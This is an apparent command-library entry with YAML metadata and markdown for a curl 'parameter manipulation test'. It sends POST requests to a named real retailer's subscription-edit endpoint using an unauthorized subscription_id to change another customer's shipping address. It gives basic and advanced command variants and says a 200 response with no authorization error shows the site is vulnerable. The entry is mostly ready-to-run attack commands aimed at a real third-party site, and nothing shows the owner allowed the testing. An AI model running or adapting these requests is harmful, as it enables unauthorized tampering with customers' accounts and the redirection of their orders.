---
id: cmd-uuid-141120-curl-param-test
data: >-
  curl -X POST 'https://www.teavana.com/subscriptions/edit' -H 'Cookie:
  session=your_session_token' -H 'Content-Type:
  application/x-www-form-urlencoded' -d
  'subscription_id=456&shipping_address=123 Fake St, Anytown, USA&submit=Update'
tags:
  - web-testing
  - parameter-manipulation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:28.523Z'
verified: false
validated: true
submitted: true
---
# curl-parameter-manipulation-test

## Command

```bash
curl -X POST 'https://www.teavana.com/subscriptions/edit' \
  -H 'Cookie: session=your_session_token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'subscription_id=456&shipping_address=123 Fake St, Anytown, USA&submit=Update'
```

## Description

This command tests parameter manipulation in the teavana.com subscription editing endpoint by sending a modified POST request with an unauthorized subscription_id to alter shipping details.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `'https://www.teavana.com/subscriptions/edit'` | Target endpoint URL | Yes |
| `-H 'Cookie: session=your_session_token'` | Authenticates the request with session cookie | Yes |
| `-H 'Content-Type: application/x-www-form-urlencoded'` | Sets request body format | Yes |
| `-d 'subscription_id=456&...'` | Payload with manipulated subscription_id and new address | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://www.teavana.com/subscriptions/edit' -H 'Cookie: session=abc123' -d 'subscription_id=456&shipping_address=New Address'
```

### Advanced Usage

```bash
curl -X POST 'https://www.teavana.com/subscriptions/edit' -H 'Cookie: session=abc123' -H 'Referer: https://www.teavana.com/account' -d 'subscription_id=456&shipping_address=123 Fake St&city=Anytown&submit=Update' -v
```

## Expected Output

HTTP 200 OK response with JSON or HTML confirming the update, e.g., {"status":"success","message":"Address updated"}. If vulnerable, no authorization error occurs.

## Related

- [[Related Procedure: Manipulate-Subscription-Editing-Parameters-for-Unauthorized-Access]]
